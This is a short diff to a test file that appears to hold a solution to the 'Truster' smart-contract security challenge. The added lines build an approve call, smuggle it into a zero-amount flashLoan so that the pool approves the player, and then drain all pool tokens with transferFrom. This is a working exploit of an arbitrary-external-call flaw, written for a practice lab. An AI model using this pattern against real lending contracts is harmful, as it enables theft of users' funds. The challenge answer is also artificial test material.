@@ -6,7 +6,7 @@ describe('[Challenge] Truster', function () {
     let token, pool;
 
     const TOKENS_IN_POOL = 1000000n * 10n ** 18n;
-
+ 
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, player] = await ethers.getSigners();
@@ -23,6 +23,11 @@ describe('[Challenge] Truster', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        let interface = new ethers.utils.Interface(["function approve(address spender, uint256 amount)"]);
+        let data = interface.encodeFunctionData("approve", [player.address, TOKENS_IN_POOL]);
+
+        await pool.connect(player).flashLoan(0, player.address, token.address, data);
+        await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL);
     });
 
     after(async function () {
